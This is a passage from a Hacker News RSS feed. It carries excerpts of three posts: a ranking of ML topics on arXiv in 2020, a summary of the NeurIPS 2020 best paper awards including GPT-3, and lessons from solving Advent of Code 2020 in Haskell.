    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.36,2.68,3.15,2.55,2.56,3.78,3.19,3.04,2.64,2.97,3.29,2.89,2.05,3.89,2.57,3.73,2.38,3.74,3.24,3.17,2.53,3.12,3.02,3.94 --></span></td>
    <td>340</td>
    <td>469</td>
  </tr>
  <tr>
    <td>14</td>
    <td><a href="http://www.image-net.org/">ImageNet</a></td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1.92,3.47,3.50,3.51,3.94,3.68,2.57,2.65,3.30,2.39,3.76,2.43,2.82,3.68,2.86,2.38,3.24,3.88,3.48,2.04,3.50,3.19,2.67,2.93 --></span></td>
    <td>361</td>
    <td>455</td>
  </tr>
  <tr>
    <td>15</td>
    <td>semantic segmentation</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.69,2.21,2.80,3.51,2.46,4.00,4.02,3.04,3.96,3.06,3.38,2.89,3.46,2.00,3.79,3.58,2.85,3.22,2.64,2.57,2.10,2.54,2.74,3.94 --></span></td>
    <td>380</td>
    <td>440</td>
  </tr>
  <tr>
    <td>16</td>
    <td>image classification</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.51,4.42,3.15,2.63,2.36,3.68,2.06,2.35,2.45,2.49,2.44,2.05,2.82,2.31,1.57,2.09,1.90,2.78,2.16,2.42,2.19,3.12,2.67,3.57 --></span></td>
    <td>307</td>
    <td>365</td>
  </tr>
  <tr>
    <td>17</td>
    <td>machine learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.36,3.63,2.21,2.39,2.27,1.73,1.34,1.47,3.11,3.73,1.60,2.61,2.69,2.42,1.93,2.31,2.38,2.56,2.16,2.26,3.15,2.83,1.76,3.12 --></span></td>
    <td>272</td>
    <td>362</td>
  </tr>
  <tr>
    <td>18</td>
    <td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFAR-10</a></td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.81,2.37,1.40,2.47,3.94,2.27,1.85,1.96,3.30,2.30,3.57,2.80,2.94,3.15,2.22,2.38,1.71,2.78,2.64,1.13,3.32,2.39,2.46,2.11 --></span></td>
    <td>303</td>
    <td>360</td>
  </tr>
  <tr>
    <td>19</td>
    <td>COVID-19</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.00,0.16,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.11,2.07,5.51,3.04,2.56,1.86,1.28,3.41,2.68,2.25,1.56 --></span></td>
    <td>1</td>
    <td>344</td>
  </tr>
  <tr>
    <td>20</td>
    <td>generalization</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1.62,2.05,1.17,2.00,1.67,2.05,1.96,1.86,2.83,2.30,2.25,2.71,1.41,2.31,2.29,2.46,2.19,3.08,2.58,1.66,2.27,2.39,1.69,2.57 --></span></td>
    <td>240</td>
    <td>339</td>
  </tr>
  <tr>
    <td></td>
    <td>Total</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 677,634,858,1253,1015,925,971,1020,1061,1045,1065,1071,781,952,1399,1342,1051,1365,1669,1325,1144,1379,1422,1091 --></span></td>
    <td>11,595</td>
    <td>14,920</td>
  </tr>
</tbody>
</table><!--kg-card-end: html--><!--kg-card-begin: markdown--><p>In computer vision, COVID-19 has been mentioned significantly more in 2020, while "convolutional neural network (CNN)" and "generative adversarial network (GAN)" are on the (relative) decline.</p>
<p>Beyond rank #20, medial imaging terms such as "chest x-ray" and "CT" are on the rise, as discussed above. "Unsupervised domain adaptation" is mentioned frequently. Unsupervised representation learning appears to be one of the biggest trends in CV, as you can see from NeurIPS 2020 (e.g., <a href="https://papers.nips.cc/paper/2020/hash/fcbc95ccdd551da181207c0c1400c655-Abstract.html">Chen et al. 2020</a>, <a href="https://papers.nips.cc/paper/2020/hash/d89a66c7c80a29b1bdbab0f2a1a94af8-Abstract.html">Khosla et al. 2020</a>, <a href="https://papers.nips.cc/paper/2020/hash/70feb62b69f16e0238f741fab228fec2-Abstract.html">Caron et al. 2020</a>).</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="technicaldetails">Technical Details</h2>
<p>I'll describe how I obtained the ranking. The code for the analysis is <a href="https://github.com/octanove/mltopics">here</a>.</p>
<p>First, I collected all the paper titles and abstracts in the target categories (cs.LG, cs.CL, cs.CV) published in 2020. All the metadata on arXiv are available under <a href="https://arxiv.org/help/license">the public domain license</a>. I used <a href="https://pypi.org/project/arxiv/">arXiv API Python library</a> for fetching the data. The total number of papers analyzed for this post is 83,339.</p>
<p><img src="https://www.ml4asia.com/content/images/2020/12/scirex.png"></p><p>I then extracted ML-related mentions from …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/">https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/</a></em></p>]]>
            </description>
            <link>https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560257</guid>
            <pubDate>Mon, 28 Dec 2020 16:05:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NeurIPS 2020 Best Machine Learning Paper Awards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560166">thread link</a>) | @KukiAirani
<br/>
December 28, 2020 | https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/ | <a href="https://web.archive.org/web/*/https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div id="content-area">
			<div id="left-area">
											<article id="post-15764">
											 <!-- .et_post_meta_wrapper -->
				
					<div>
					<div id="et-boc">
			
		<div>
			<div><div>
				
				
				
				
					<div>
				<div>
				
				
				<div>
				
				
				<div><p><span>This was one hard, very hard year for all of us</span><span>.&nbsp;It was a year in which pandemic reshaped our world. It seems that this trend is going to go continue further in 2021. The field of AI, however, was not impacted that much by all these changes. At least not in a negative way. A steady flow of research papers was not stopped, in fact, we saw some quite amazing breakthroughs. That is why, for the last article of 2020, we decided to write about </span><strong>awarded </strong><span>research </span><strong>papers </strong><span>from </span><strong>Neural Information Processing Systems</strong><span> (</span><em>NeurIPS</em><span>) conference.</span></p>
<p><span> Looking at the old logo of </span><em>NeurIPS&nbsp;</em><span>conference, my wife asked me “What is that? Is that a witchcraft conference?”. Close, but no, it is one of the most </span><strong>important</strong><span> machine learning conferences. In fact, </span><span>the&nbsp;</span><em>NeurIPS </em><span>awards are something like the </span><em>Oscars </em><span>in the world of machine learning. Every year a bunch of papers is proposed to and the best papers are awarded. This was the thirty-fourth&nbsp;</span><em>NeurIPS </em><span>conference and it was held online. Interesting thing is that this years’ conference had the biggest number of </span><strong>submissions </strong><span>ever. This year 38% more papers were accepted than the last, which is 1,903 as compared to 2019’s 1,428. This says a lot about the state of the machine learning industry.&nbsp;</span></p></div>
			</div> <!-- .et_pb_text --> <!-- .et_pb_text --><p><a href="https://rubikscode.net/deep-learning-for-programmers/"><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?w=1080&amp;ssl=1" alt="" title="0" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?w=1200&amp;ssl=1 1200w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=1080%2C608&amp;ssl=1 1080w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=980%2C551&amp;ssl=1 980w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/0.jpg?resize=480%2C270&amp;ssl=1 480w" sizes="(max-width: 1080px) 100vw, 1080px" data-recalc-dims="1"></span></a>
			</p><div>
				
				
				<div><p>Are you afraid that AI might take your job? Make sure you are the one who is building it.</p>
<p>STAY RELEVANT IN THE RISING AI INDUSTRY! 🖖</p>
</div>
			</div> <!-- .et_pb_text --><div>
				
				
				<div>
<p>From a huge number of submitted papers and 1903 accepted papers – 3 were awarded. This year winning papes are:</p>

<ul>
<li>Language Models are Few-Shot Learners</li>
<li>No-Regret Learning Dynamics for Extensive-Form Correlated Equilibrium</li>
<li>Improved Guarantees and a Multiple-Descent Curve for Column Subset Selection and the Nystrom Method</li>
</ul>

<p>The <em>NeurIPS </em>committee was guided by several <strong>criteria</strong>. The best paper has to be revolutionary, creative and have a certain elegance, but it has feasible, realistic and reproducible as well. It also shouldn’t be over complicated and inefficient. In our opinion committee have done an awesome job 🙂</p>
</div>
			</div> <!-- .et_pb_text --><p><span><img src="https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?w=1080&amp;ssl=1" alt="Decision Tree" title="tree" srcset="https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?w=1210&amp;ssl=1 1210w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=300%2C237&amp;ssl=1 300w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=1024%2C809&amp;ssl=1 1024w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=768%2C607&amp;ssl=1 768w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=1080%2C853&amp;ssl=1 1080w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=980%2C774&amp;ssl=1 980w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=480%2C379&amp;ssl=1 480w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=24%2C19&amp;ssl=1 24w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=36%2C28&amp;ssl=1 36w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=48%2C38&amp;ssl=1 48w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/02/tree.png?resize=600%2C474&amp;ssl=1 600w" sizes="(max-width: 1080px) 100vw, 1080px" data-recalc-dims="1"></span>
			</p><div id="gpt3">
				
				
				<p><h2 role="textbox" aria-multiline="true" contenteditable="true" aria-label="Write heading…">Language Models are Few-Shot Learners</h2></p>
			</div> <!-- .et_pb_text --><div>
				
				
				<div>
<p>It is would be a small thing to say that GPT-3 blew us all away this year. We already see so many applications that are utilizing the concepts presented in this paper. In general, we may say that GPT-3 was the biggest disruption we saw this year, so there is no wonder why this paper won at this year’s conference. The background of this fascinating paper, released by researchers from Open AI, lies in the fact that transfer learning is becoming dominant in <strong>NLP</strong>. Meaning that the industry is heavily using models that are pre-trained on a large corpus of text and then fine-tune them on a specific task.</p>
<p><strong>Fine-tuning</strong> itself can be time-consuming. On the other hand, humans can perform a new language task from only a few examples, which is something that NLP models are trying to achieve (even though they are still far away from it). In order to improve that and generate more t<strong>ask agnostic</strong> solution, OpenAI trained <strong>GPT-3</strong> model with <strong>175 billion parameters</strong> and tested its performance without any fine-tuning. As expected, they achieve some amazing results. Just for comparison, last year’s GPT-2 had 1.5 billion parameters and this month Microsoft introduced (until now) the largest Transform based language model that had 17 billion parameters. So, yes, GPT-3 is a huge autoregressive model trained with unsupervised learning and few-shot learning.</p>
</div>
			</div> <!-- .et_pb_text --><p><span><img src="https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?w=1080&amp;ssl=1" alt="ResNet Architecture" title="undraw_predictive_analytics_kf9n" srcset="https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?w=1039&amp;ssl=1 1039w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=300%2C233&amp;ssl=1 300w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=1024%2C795&amp;ssl=1 1024w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=768%2C597&amp;ssl=1 768w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=980%2C761&amp;ssl=1 980w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=480%2C373&amp;ssl=1 480w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=24%2C19&amp;ssl=1 24w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=36%2C28&amp;ssl=1 36w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=48%2C37&amp;ssl=1 48w, https://i1.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_predictive_analytics_kf9n.png?resize=600%2C466&amp;ssl=1 600w" sizes="(max-width: 1039px) 100vw, 1039px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<p>Architecturally speaking, there are no changes from the <strong>GPT-2</strong> model. All the nitty-gritty details like modified initialization, pre-normalization and reversible tokenization are the same. The only <strong>difference</strong> is that that this time authors used alternating dense and locally banded sparse attention patterns in the layers of the transformer. Also, this large GPT-3 model was not the only model that is trained for the purposes of this paper. There are <strong>8 models</strong>, with parameters variating from 125 million to 175 billion parameters:</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/gpt31.jpg?w=1080&amp;ssl=1" alt="" title="gpt31" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/gpt31.jpg?w=589&amp;ssl=1 589w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/gpt31.jpg?resize=300%2C90&amp;ssl=1 300w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/gpt31.jpg?resize=480%2C144&amp;ssl=1 480w" sizes="(max-width: 589px) 100vw, 589px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<p>In this table, we can also see the sizes of the batches used for model training. These models are trained on following <strong>datasets</strong>:</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?w=1080&amp;ssl=1" alt="" title="datasetsgpt3" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?w=480&amp;ssl=1 480w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?resize=300%2C88&amp;ssl=1 300w" sizes="(max-width: 480px) 100vw, 480px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<p>The results from all the categories are mindblowing. For example, for traditional language modeling tasks, GPT-3 sets a new <strong>SOTA</strong> on the <em>Penn Tree Bank</em> dataset by a margin of 15 points based on zero-shot perplexity. GPT-3 showed amazing results in <em>question answering</em> tests. In general, these tests are separated into open-book and closed-book tests. Due to the number of possible queries, open-book tests use an information retrieval system to find relevant text and then the model learns to generate the answer from the question and retrieved text. Closed-book tests don’t have this retrieval system.</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?w=1080&amp;ssl=1" alt="ResNet Architecture" title="undraw_financial_data_es63" srcset="https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?w=1378&amp;ssl=1 1378w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=300%2C196&amp;ssl=1 300w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=1024%2C670&amp;ssl=1 1024w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=768%2C502&amp;ssl=1 768w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=1080%2C706&amp;ssl=1 1080w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=1280%2C837&amp;ssl=1 1280w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=980%2C641&amp;ssl=1 980w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=480%2C314&amp;ssl=1 480w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=24%2C16&amp;ssl=1 24w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=36%2C24&amp;ssl=1 36w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=48%2C31&amp;ssl=1 48w, https://i2.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_financial_data_es63.png?resize=600%2C392&amp;ssl=1 600w" sizes="(max-width: 1080px) 100vw, 1080px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<div><p>GPT-3 <strong>achieved</strong> 64.3% in the zero-shot setting, 68.0% in the one-shot setting, and 71.2% in the few-shot setting closed-book tests on the <em>TriviaQA</em> dataset. It <strong>outperformed</strong> fine-tuned <em>T5-11B</em> by 14.2% in a zero-shot setting. Note that <em>T5-11B</em> is finetuned, while <em>GPT-3</em> is not. It is interesting that on translation tasks, GPT-3 also sets new <strong>SOTA</strong> when it comes to translation into English. It outperforms previous unsupervised <em>NMT</em> work by 5 BLEU. For the other tasks, like Winograd-Style Tasks, Common Sense Reasoning and Reading Comprehension, GPT-3 also proved it’s superiority. Read more in the paper about it.</p>
<p>Since GPT-3 was focused on task-agnostic performance, it was not fine-tuned. This means that there is a lot more room for <strong>improvement</strong> and that we will see some results in that field rather soon.</p></div>
			</div> <!-- .et_pb_text --><div>
				
				
				<div><p>The NeurIPS commitie comment:</p>
<blockquote>
<p><em>Language models form the backbone of modern techniques for solving a range of problems in natural language processing. The paper shows that when such language models are scaled up to an unprecedented number of parameters, the language model itself can be used as a few-shot learner that achieves very competitive performance on many of these problems without any additional training. This is a very surprising result that is expected to have substantial impact in the field, and that is likely to withstand the test of time. In addition to the scientific contribution of the work, the paper also presents a very extensive and thoughtful exposition of the broader impact of the work, which may serve as an example to the NeurIPS community on how to think about the real-world impact of the research performed by the community.</em></p>
</blockquote></div>
			</div> <!-- .et_pb_text --><div>
				
				
				<p>Read the complete paper<span>&nbsp;</span><strong><a href="https://arxiv.org/pdf/2005.14165.pdf" target="_blank" rel="noopener noreferrer">here</a></strong>.</p>
			</div> <!-- .et_pb_text --><div id="gpt3">
				
				
				<p><h2 role="textbox" aria-multiline="true" contenteditable="true" aria-label="Write heading…">No-Regret Learning Dynamics for Extensive-Form Correlated Equilibrium</h2></p>
			</div> <!-- .et_pb_text --><div>
				
				
				<p>This paper addresses the problem related to game theory, computer science, and even economics. To me more specific it starts from the <strong>Nash equilibrium</strong> theory. Nash equilibrium is a concept where the <strong>optimal</strong> outcome of a game is one where no player has a motivation to deviate from her strategy after considering an opponent’s choice. For example, let’s consider two players <em>P1</em> and <em>P2</em> which choose strategies <em>S1</em> and <em>S2</em>. The set of strategies <em>(S1, S2)</em> is a Nash equilibrium if <em>P1</em> doesn’t have other strategies that provide a better payoff than <em>S1</em> in response to <em>P2</em> choosing <em>S2</em>. On the other hand, <em>P2</em> has no other strategy that does better than <em>P2</em> at maximizing her payoff in response to <em>P1</em> choosing <em>S1</em>.</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?w=1080&amp;ssl=1" alt="ResNet Architecture" title="undraw_metrics_gtu7" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?w=1142&amp;ssl=1 1142w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=300%2C219&amp;ssl=1 300w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=1024%2C748&amp;ssl=1 1024w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=768%2C561&amp;ssl=1 768w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=1080%2C789&amp;ssl=1 1080w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=980%2C716&amp;ssl=1 980w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=480%2C351&amp;ssl=1 480w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=24%2C18&amp;ssl=1 24w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=36%2C26&amp;ssl=1 36w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=48%2C35&amp;ssl=1 48w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/03/undraw_metrics_gtu7.png?resize=600%2C438&amp;ssl=1 600w" sizes="(max-width: 1080px) 100vw, 1080px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<div><p>However, this theory assumes that interaction among the players is decentralized, which brings us to the conclusion that Nash Equilibrium is a distribution on the <strong>uncorrelated</strong> strategy space. The variation of this theory – <strong>Correlated Equilibrium</strong> assumes that general distribution over joint action profiles is modeled via an external <strong>mediator</strong>. This mediator, privately recommends to each player her next best action. The extension of this theory is called <strong>extensive-form correlated equilibrium (EFCE)</strong> and it is especially useful in sequential strategic interactions. According to this theory, the mediator at the beginning of the interaction gathers all possible recommendations for each step of the sequential interaction. However, she <strong>incrementally</strong> reveals relevant individual moves as the player reaches the step. At each step, the player can accept the mediator’s recommendation or disregard it, but by doing so recommendations are no longer provided for her.</p>
<p>Authors focus on a specific setting – general-sum extensive-form games with an arbitrary number of players. In practice, there is no effective way to solve <strong>EFCE</strong> for this setting. So, the authors essentially showed that is it possible to <strong>devise</strong> simple dynamics that leading to a feasible <strong>EFCE</strong>. They do so by introducing several notions. The first notion is the triggering agent. <strong>Trigger agent</strong> for player i is an agent that takes on the role of player and commits to following all recommendations unless she reaches action <em>I</em> and gets recommended to play action <em>a</em>. If this happens, the player <strong>stops</strong> committing to the recommendations and plays according to a plan until the game ends. Based on this notion of the trigger regret is defined. Trigger regret measures the regret that each trigger agent has for not having played the best-in-hindsight strategy. This is internal regret because it represents cumulative internal regret of player up to iteration <em>T</em>.</p>
<p>Finally, the authors provide an algorithm, called <strong>ICFR</strong>. This is the regret minimization algorithm that minimizes trigger agent regrets via the decomposition of these regrets locally at each information set. That algorithm looks like this:</p></div>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/12/1-1.png?w=1080&amp;ssl=1" alt="ResNet Architecture" title="1" data-recalc-dims="1"></span>
			</p><div>
				
				
				<div><p>The NeurIPS commitie comment:</p>
<blockquote>
<p><em>Correlated equilibria (CE) are easy to compute and can attain a social welfare that is much higher than that of the better-known Nash equilibria. In normal form games, a surprising feature of CE is that they can be found by simple and decentralized algorithms minimizing a specific …</em></p></blockquote></div></div></div></div></div></div></div></div></div></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/">https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/</a></em></p>]]>
            </description>
            <link>https://rubikscode.net/2020/12/28/neurips-2020-best-machine-learning-paper-awards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560166</guid>
            <pubDate>Mon, 28 Dec 2020 15:57:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learnings from Solving Advent of Code 2020 in Haskell]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560044">thread link</a>) | @todsacerdoti
<br/>
December 28, 2020 | https://notes.abhinavsarkar.net/2020/aoc-learnings | <a href="https://web.archive.org/web/*/https://notes.abhinavsarkar.net/2020/aoc-learnings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <header>
      <span><a href="https://notes.abhinavsarkar.net/">Abhinav's Notes</a></span>
      
    </header>
    <section>
    <span>2020-12-26</span>
    
    
    
    
    
      <a href="https://github.com/abhin4v/notes/edit/master/2020/aoc-learnings.md">Edit</a>
    
    </section>
    <main>
      

<p>After many years of trying unsuccessfully, I finally completed all 25 days of the <a href="https://adventofcode.com/2020/">Advent of Code 2020</a> in Haskell. Here is a summary of my learnings and solutions.</p>

<h2 id="learnings">Learnings</h2>

<ul>
  <li>GHCi is a powerful REPL. We can do almost anything in it which we can do in a file. It is also fast and great to play with code.</li>
  <li><a href="http://learnyouahaskell.com/zippers">Zippers</a> are an awesome technique to move around in a data structure. We can also think of them as focus points in spaces like lines, plains or 3D volumes. Many AoC problems are about moving around in space, doing things at the focus points. Zippers are quite suitable for such problems.</li>
  <li><a href="https://hackage.haskell.org/package/split/docs/Data-List-Split.html">Data.List.Split</a> module is good enough for basic input parsing.</li>
  <li>It is trivially easy to write a simple but feature-rich parser framework in Haskell. <a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-7">Here</a> is one in its entirety, with some example parsers, in just 24 lines.</li>
  <li><a href="https://hackage.haskell.org/package/graph-wrapper/docs/Data-Graph-Wrapper.html">Data.Graph.Wrapper</a> is a useful wrapper over <a href="https://hackage.haskell.org/package/containers/docs/Data-Graph.html">Data.Graph</a>.</li>
  <li>Haskell is good for writing interpreters.</li>
  <li>Graph traversal + Memoization = Dynamic programming.</li>
  <li>Use <a href="https://hackage.haskell.org/package/MemoTrie/docs/Data-MemoTrie.html">Data.Memotrie</a> for side-effect-free memoization in Haskell.</li>
  <li>Sometimes it’s faster to recompute than to memoize because of the lazy nature of Haskell and the extra memory usage caused by memoization.</li>
  <li><a href="https://hackage.haskell.org/package/comonad">Comonads</a> are great to simulate <a href="https://en.wikipedia.org/wiki/Cellular_automaton">Cellular automata</a>. Zippers are comonads.</li>
  <li>Comonad based cellular automata do not mutate the state of the automata universe, neither do they compute and materialize the whole universe at every step of the automata. Rather, they just stack functions over functions to create new lazy views over the original universe. This means that we can have lazy infinite universes. This also means that simulating cellular automata using comonads tends to get slower with increasing number of neighbours/dimensions.</li>
  <li>Sometimes mutability is the only option if we want to implement a fast algorithm. Mutable vectors from the <a href="https://hackage.haskell.org/package/vector">vector</a> library are great for this.</li>
  <li>Writing the <a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-17">four-dimensional zipper comonad</a> from scratch is complex and takes a really long time.</li>
  <li><a href="https://english.stackexchange.com/questions/56472/x-y-z-horizontal-vertical-and">There are no words</a> similar to <em>horizontal</em> and <em>vertical</em> for three dimensions or more.</li>
  <li><a href="https://hackage.haskell.org/package/base/docs/Text-ParserCombinators-ReadP.html">ReadP</a> is a good, minimal and easy to use parser framework which is included in the Haskell standard library.</li>
  <li>Try to use <a href="https://en.wikipedia.org/wiki/Bit_array">Bit arrays</a> when they fit, for performant solutions.</li>
  <li>Some problems, when scaled up, cannot be solved with lazy lists in a reasonable time.</li>
  <li>We can simulate a linked list of integers over a vector.</li>
  <li>If a program generates a lot of garbage, turning on multithreading (<code>-threaded</code>) and parallel garbage collection (<code>-qg0 -N</code>) may make it run faster.</li>
  <li>Tweaking the heap size (<code>-H</code>) and the allocation area size (<code>-A</code>) may make a program run faster.</li>
  <li>Use the <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/glasgow_exts.html#extension-Strict"><code>Strict</code></a> extension cautiously. Sometimes it may unexpectedly make a program run slower.</li>
  <li><a href="https://www.youtube.com/watch?v=thOifuHs6eY">Hexagons are the bestagons</a>.</li>
</ul>

<h2 id="solutions">Solutions</h2>
<p>Here’s the index of all the solutions I wrote for AoC 2020:</p>

<table>
  <thead>
    <tr>
      <th>Problem</th>
      <th>Solution</th>
      <th>Salient points</th>
      <th>Libraries/modules used</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/1">1</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-1">↗</a></td>
      <td>List comprehensions</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/2">2</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-2">↗</a></td>
      <td>Validation</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/3">3</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-3">↗</a></td>
      <td>Zippers</td>
      <td><em>None</em></td>
    </tr>
    <tr>
